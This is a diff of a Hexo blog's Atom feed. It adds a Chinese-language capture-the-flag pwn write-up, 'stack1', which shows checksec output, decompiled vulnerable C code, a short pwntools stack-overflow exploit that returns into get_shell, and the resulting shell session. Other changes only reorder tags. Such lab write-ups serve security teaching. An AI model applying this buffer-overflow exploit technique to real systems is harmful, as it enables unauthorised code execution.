@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://iosmosis.github.io/"/>
-  <updated>2018-05-27T11:00:03.441Z</updated>
+  <updated>2018-06-09T10:07:48.110Z</updated>
   <id>http://iosmosis.github.io/</id>
   
   <author>
@@ -14,6 +14,29 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Syclover-Pwn-练习题</title>
+    <link href="http://iosmosis.github.io/2018/06/09/Syclover-Pwn-%E7%BB%83%E4%B9%A0%E9%A2%98/"/>
+    <id>http://iosmosis.github.io/2018/06/09/Syclover-Pwn-练习题/</id>
+    <published>2018-06-09T09:56:41.000Z</published>
+    <updated>2018-06-09T10:07:48.110Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="stack1"><a href="#stack1" class="headerlink" title="stack1"></a>stack1</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">ios@ubuntu:~$ checksec stack1</div><div class="line">[*] <span class="string">'/home/ios/stack1'</span></div><div class="line">    Arch:     amd64-64-little</div><div class="line">    RELRO:    Partial RELRO</div><div class="line">    Stack:    No canary found</div><div class="line">    NX:       NX enabled</div><div class="line">    PIE:      No PIE (0x400000)</div><div class="line">ios@ubuntu:~$</div></pre></td></tr></table></figure>
+<p>开启NX保护<br>IAD载入分析代码<br>main()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">int __cdecl main(int argc, const char **argv, const char **envp)</div><div class="line">&#123;</div><div class="line">  char v4; // [rsp+0h] [rbp-20h]</div><div class="line"></div><div class="line">  puts(&quot;get input&quot;);</div><div class="line">  scanf(&quot;%s&quot;, &amp;v4);</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>get_shell()<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">int get_shell()</div><div class="line">&#123;</div><div class="line">  return system(&quot;/bin/sh&quot;);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>简单栈溢出 已给shell 所以覆盖v4之后ret到get_shell 地址即可<br>exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">p = process(<span class="string">'./stack1'</span>)</div><div class="line">sys_addr=<span class="number">0x000000000004005B6</span></div><div class="line">payload = <span class="string">'A'</span>*<span class="number">0x20</span> +<span class="string">'b'</span>*<span class="number">8</span> +p64(sys_addr)</div><div class="line">p.sendline(payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
+<p>成功取得shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">ios@ubuntu:~$ python stack1.py</div><div class="line">[+] Starting local process &apos;./stack1&apos;: pid 2228</div><div class="line">[*] Switching to interactive mode</div><div class="line">get input</div><div class="line">$ ls</div><div class="line">flag</div><div class="line">$ </div><div class="line">[*] Interrupted</div><div class="line">[*] Stopped process &apos;./stack1&apos; (pid 2228)</div><div class="line">ios@ubuntu:~$</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;stack1&quot;&gt;&lt;a href=&quot;#stack1&quot; class=&quot;headerlink&quot; title=&quot;stack1&quot;&gt;&lt;/a&gt;stack1&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutt
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>NPUCTF部分Writeup</title>
@@ -90,11 +113,11 @@
     
       <category term="Pwn" scheme="http://iosmosis.github.io/tags/Pwn/"/>
     
-      <category term="writeup" scheme="http://iosmosis.github.io/tags/writeup/"/>
-    
       <category term="NPUCTF" scheme="http://iosmosis.github.io/tags/NPUCTF/"/>
     
       <category term="WEB" scheme="http://iosmosis.github.io/tags/WEB/"/>
+    
+      <category term="writeup" scheme="http://iosmosis.github.io/tags/writeup/"/>
     
   </entry>
   
@@ -269,11 +292,11 @@
     
       <category term="Pwn" scheme="http://iosmosis.github.io/tags/Pwn/"/>
     
+      <category term="writeup" scheme="http://iosmosis.github.io/tags/writeup/"/>
+    
       <category term="Jarvis OJ" scheme="http://iosmosis.github.io/tags/Jarvis-OJ/"/>
     
       <category term="栈溢出" scheme="http://iosmosis.github.io/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
-    
-      <category term="writeup" scheme="http://iosmosis.github.io/tags/writeup/"/>
     
   </entry>
   
